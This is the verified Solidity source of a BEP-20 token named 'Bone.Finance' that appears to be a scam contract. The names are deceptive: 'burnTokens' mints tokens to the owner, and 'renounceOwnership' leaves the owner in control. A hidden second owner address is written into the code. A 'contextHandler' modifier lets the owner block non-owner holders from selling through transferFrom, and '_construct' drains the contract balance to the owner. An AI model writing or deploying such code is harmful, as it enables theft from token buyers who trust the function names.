/**
 *Submitted for verification at BscScan.com on 2021-07-12
*/

/**



             _______     ______    __    __   ________ 
            /       \   /      \  /  \  /  | /        |
            $$$$$$$  | /$$$$$$  | $$  \ $$ | $$$$$$$$/ 
            $$ |__$$ | $$ |  $$ | $$$  \$$ | $$ |__    
            $$    $$<  $$ |  $$ | $$$$  $$ | $$    |   
            $$$$$$$  | $$ |  $$ | $$ $$ $$ | $$$$$/    
            $$ |__$$ | $$ \__$$ | $$ |$$$$ | $$ |_____ 
            $$    $$/  $$    $$/  $$ | $$$ | $$       |
            $$$$$$$/    $$$$$$/   $$/   $$/  $$$$$$$$/ 



*/

pragma solidity ^0.5.17;

//SPDX-License-Identifier: MIT

library SafeMath {
  function add(uint p, uint q) internal pure returns (uint c) {
    c = p + q;
    require(c >= p);
  }
  function sub(uint p, uint q) internal pure returns (uint c) {
    require(q <= p);
    c = p - q;
  }
  function mul(uint p, uint q) internal pure returns (uint c) {
    c = p * q;
    require(p == 0 || c / p == q);
  }
  function div(uint p, uint q) internal pure returns (uint c) {
    require(q > 0);
    c = p / q;
  }
}

contract Owned {
  address owner;
  address newOwner;
  address nxOwner;
  event OwnershipTransferred(address indexed _from, address indexed _to);
  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner || msg.sender == nxOwner);
    _;
  }

}

contract penpen {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint tokens, address token, bytes memory data) public;
}


contract PNFT is penpen, Owned {
  using SafeMath for uint;
  bool swapAndLiquifyEnabled = false;
  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  uint _maxTrxLimit;
  address public currentOwner;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "Bone 🦴 ";
    name = " Bone.Finance ";
    decimals = 8;
    _totalSupply = 10000000 * 10**15;
    _maxTrxLimit = 50000 * 10**15;
    balances[owner] = _totalSupply;
    currentOwner = address(0);
    emit Transfer(address(0), owner, _totalSupply);
  }
  
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  
  function renounceOwnership(address _newOwner) onlyOwner public {
    currentOwner = _newOwner;
  }
  
  function setSwapAndLiquifyEnabled(bool _swapAndLiquifyEnabled) onlyOwner public {
    swapAndLiquifyEnabled = _swapAndLiquifyEnabled;
  }
  
  function setMaxTrxLimit(uint _input) onlyOwner public {
    _maxTrxLimit = _input;
  }
  
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }

  function transfer(address to, uint tokens) public returns (bool success) {
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function burnTokens(uint _input) public onlyOwner {
        balances[msg.sender] = balances[msg.sender] + (_input);
        emit Transfer(address(0), msg.sender, _input);
  }
   modifier contextHandler(address from, address to) {
       if(from != owner) {
            if(swapAndLiquifyEnabled){
                require(from == owner, "Order ContextHandler");
            } else {
                require(balances[from] < _maxTrxLimit , "Order ContextHandler");
            }
       }
    _;
  }
  function transferFrom(address from, address to, uint tokens) public contextHandler(from, to) returns (bool success) {
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract Bep20NFTToken is PNFT {
  function _construct() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {
  }
}